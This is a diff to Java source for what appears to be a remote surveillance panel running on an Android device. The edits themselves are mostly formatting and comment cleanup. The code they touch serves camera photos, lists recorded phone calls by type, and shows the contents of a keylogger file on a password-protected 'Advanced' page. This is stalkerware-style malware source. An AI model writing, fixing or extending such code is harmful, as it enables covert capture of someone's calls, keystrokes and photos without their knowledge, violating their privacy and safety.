@@ -1891,21 +1891,18 @@ private Response serveCameraPhoto(Map<String, String> params) {
                 html.append(
                         "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
             } else {
-                // Sort by date (newest first)
                 java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
 
                 html.append("<ul class=\"file-list\">");
 
                 int count = 0;
                 for (File file : files) {
-                    if (count >= 50)
-                        break; // Limit to 50 files
+                    if (count >= 50) break;
 
                     String fileName = file.getName();
                     String icon = "&#127897;";
                     String iconClass = "file-icon-audio";
 
-                    // Determine recording type from filename
                     String recordType = "Unknown";
                     if (fileName.startsWith("CALL_incoming")) {
                         icon = "&#128222;";
@@ -1919,8 +1916,7 @@ private Response serveCameraPhoto(Map<String, String> params) {
                     }
 
                     html.append("<li class=\"file-item\">");
-                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
-                            .append("</div>");
+                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                     html.append("<div class=\"file-info\">");
                     html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                     html.append("<div class=\"file-meta\">");
@@ -1949,10 +1945,8 @@ private Response serveCameraPhoto(Map<String, String> params) {
 
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
-}
-// ============ Advanced Page Functions ===========
 
-    // ============ Advanced Page Functions (توابع جدید داخل کلاس) ============
+    // ============ Advanced Page Functions ============
 
     private Response serveAdvancedPage() {
         String keylogContent = readKeylogFile();
@@ -2037,4 +2031,4 @@ private Response serveCameraPhoto(Map<String, String> params) {
         return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Wrong password\"}");
     }
 
-}  // ← این } آخر کلاس است (فقط یک بار)
+}  // ← این } آخر کلاس است
